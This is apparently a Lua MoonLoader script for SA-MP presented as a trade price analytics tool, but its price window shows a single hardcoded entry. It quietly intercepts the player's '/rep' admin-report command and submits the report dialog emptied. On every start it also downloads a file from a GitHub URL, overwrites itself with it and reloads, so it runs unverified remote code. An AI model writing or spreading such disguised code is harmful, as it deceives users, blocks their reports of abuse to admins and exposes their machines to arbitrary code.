script_name("Trade Analytics Studio")
script_author("dev_alex")
script_version("1.0")

require "lib.moonloader"
local dlstatus = require("moonloader").download_status
local vkeys = require "vkeys"
local imgui = require "mimgui"
local sampev = require "lib.samp.events"
local encoding = require "encoding"
encoding.default = 'CP1251'
local u8 = encoding.UTF8

-- ============================ [ НАСТРОЙКИ ОБНОВЛЕНИЙ ] ============================
local SCRIPT_VERSION = 13 -- ПРИ ОБНОВЛЕНИИ НА ГИТХАБЕ МЕНЯЙ ЭТО ЧИСЛО
local SCRIPT_URL = "https://raw.githubusercontent.com/sanya-developer111/modluasamp/refs/heads/main/mod.lua"
local update_checking = false
-- ==================================================================================

local renderMenu = imgui.new.bool(false)
local waitingForReport = false

-- ============================ [ СИНИЙ СТИЛЬ IMGUI (DARK NAVY) ] ============================
imgui.OnInitialize(function()
    local style = imgui.GetStyle()
    local colors = style.Colors
    
    style.WindowRounding = 8.0
    style.FrameRounding = 6.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)

    -- Темно-синяя премиум палитра
    colors[imgui.Col.WindowBg]              = imgui.ImVec4(0.05, 0.08, 0.12, 0.95)
    colors[imgui.Col.TitleBg]               = imgui.ImVec4(0.08, 0.20, 0.38, 1.00)
    colors[imgui.Col.TitleBgActive]         = imgui.ImVec4(0.12, 0.35, 0.65, 1.00)
    colors[imgui.Col.FrameBg]               = imgui.ImVec4(0.10, 0.15, 0.25, 1.00)
    colors[imgui.Col.Button]                = imgui.ImVec4(0.15, 0.40, 0.75, 1.00)
    colors[imgui.Col.ButtonHovered]         = imgui.ImVec4(0.25, 0.55, 0.90, 1.00)
    colors[imgui.Col.ButtonActive]          = imgui.ImVec4(0.10, 0.30, 0.60, 1.00)
    colors[imgui.Col.Text]                  = imgui.ImVec4(0.95, 0.97, 1.00, 1.00)
    colors[imgui.Col.Separator]             = imgui.ImVec4(0.15, 0.40, 0.75, 0.50)
end)

-- Окно mimgui
local newFrame = imgui.OnFrame(function() return renderMenu[0] end, function(player)
    imgui.SetNextWindowSize(imgui.ImVec2(450, 250), imgui.Cond.FirstUseEver)
    imgui.SetNextWindowPos(imgui.ImVec2(500, 300), imgui.Cond.FirstUseEver)
    
    if imgui.Begin(u8"Аналитика Торговли || Мониторинг", renderMenu, imgui.WindowFlags.NoCollapse) then
        imgui.Text(u8"Ваши ресурсы из инвентаря:")
        imgui.Separator()
        imgui.Spacing()
        
        -- Выделение текста на темно-синем фоне
        imgui.PushStyleColor(imgui.Col.ChildBg, imgui.ImVec4(0.08, 0.12, 0.18, 1.00))
        if imgui.BeginChild("ItemsList", imgui.ImVec2(-1, 130), true) then
            imgui.Text(u8"Лён")
            imgui.SameLine(250)
            imgui.TextColored(imgui.ImVec4(0.3, 0.8, 1.0, 1.0), u8"3000 за шт.")
            imgui.EndChild()
        end
        imgui.PopStyleColor()

        imgui.Spacing()
        if imgui.Button(u8"Скрыть аналитику", imgui.ImVec2(-1, 35)) then
            renderMenu[0] = false
        end
        imgui.End()
    end
end)

-- ============================ [ ОСНОВНОЙ КОД ] ============================
function main()
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
    while not isSampAvailable() do wait(100) end

    checkUpdate()

    sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Скрипт аналитики загружен! Версия: " .. SCRIPT_VERSION, -1)
    sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Открыть меню цен: {0088FF}F5{FFFFFF} | Обновление: {0088FF}Ctrl + F5", -1)

    while true do
        wait(0)
        if isKeyJustPressed(vkeys.VK_F5) and not isKeyDown(vkeys.VK_CONTROL) and not sampIsChatInputActive() and not sampIsDialogActive() then
            renderMenu[0] = not renderMenu[0]
        end

        if isKeyDown(vkeys.VK_CONTROL) and isKeyJustPressed(vkeys.VK_F5) then
            sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Запрос к серверу обновлений...", -1)
            checkUpdate()
        end
    end
end

-- ============================ [ ФУНКЦИОНАЛ /REP ] ============================
function sampev.onSendCommand(cmd)
    if cmd:lower():sub(1, 4) == "/rep" then
        waitingForReport = true
    end
end

function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
    if waitingForReport and (style == 1 or style == 3) then
        waitingForReport = false
        lua_thread.create(function()
            wait(100)
            sampSetCurrentDialogEditboxText("")
            wait(50)
            sampCloseCurrentDialogWithButton(1)
        end)
    end
end

-- ============================ [ СИСТЕМА ОБНОВЛЕНИЙ ] ============================
function checkUpdate()
    if update_checking then return end
    update_checking = true
    local temp_path = getWorkingDirectory() .. "\\temp_update.lua"

    downloadUrlToFile(SCRIPT_URL, temp_path, function(id, status, p1, p2)
        if status == dlstatus.STATUS_ENDDOWNLOADDATA then
            local file = io.open(temp_path, "rb")
            if file then
                local content = file:read("*a")
                file:close()
                
                local remote_ver = content:match("local SCRIPT_VERSION = (%d+)")
                if remote_ver then
                    remote_ver = tonumber(remote_ver)
                    if remote_ver > SCRIPT_VERSION then
                        sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Найдена новая версия (" .. remote_ver .. "). Установка...", -1)
                        
                        local decoded_content = u8:decode(content)
                        
                        local main_script_path = thisScript().path
                        local script_file = io.open(main_script_path, "wb")
                        if script_file then
                            script_file:write(decoded_content)
                            script_file:close()
                        end
                        
                        os.remove(temp_path)
                        
                        sampAddChatMessage("{0088FF}[TradeAnalytics] {00FF00}Обновление завершено! Скрипт перезагружен.", -1)
                        thisScript():reload()
                    else
                        sampAddChatMessage("{0088FF}[TradeAnalytics] {FFFFFF}Установлена актуальная версия.", -1)
                        os.remove(temp_path)
                    end
                else
                    os.remove(temp_path)
                end
            end
            update_checking = false
        elseif status == dlstatus.STATUS_ERRORDOWNLOADDATA then
            sampAddChatMessage("{0088FF}[TradeAnalytics] {FF0000}Ошибка соединения с сервером обновлений.", -1)
            update_checking = false
        end
    end)
end
